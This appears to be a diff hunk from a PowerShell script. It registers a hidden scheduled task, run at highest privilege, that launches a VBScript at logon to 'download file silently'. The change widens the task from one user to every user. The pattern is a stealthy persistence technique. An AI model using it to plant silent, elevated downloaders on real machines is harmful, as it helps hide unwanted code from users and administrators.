@@ -68,7 +68,7 @@ Write-Host "VBScript launcher created at $vbscriptPath"
 
 # Schedule the VBScript launcher to run completely hidden at next login
 $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbscriptPath`""
-$trigger = New-ScheduledTaskTrigger -AtLogOn -User $adminUsername
+$trigger = New-ScheduledTaskTrigger -AtLogOn 
 
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "DownloadAtLogon" -Description "download file silently using VBScript" -RunLevel Highest -Force
 write-host "Scheduled task 'DownloadAtLogon' created successfully."
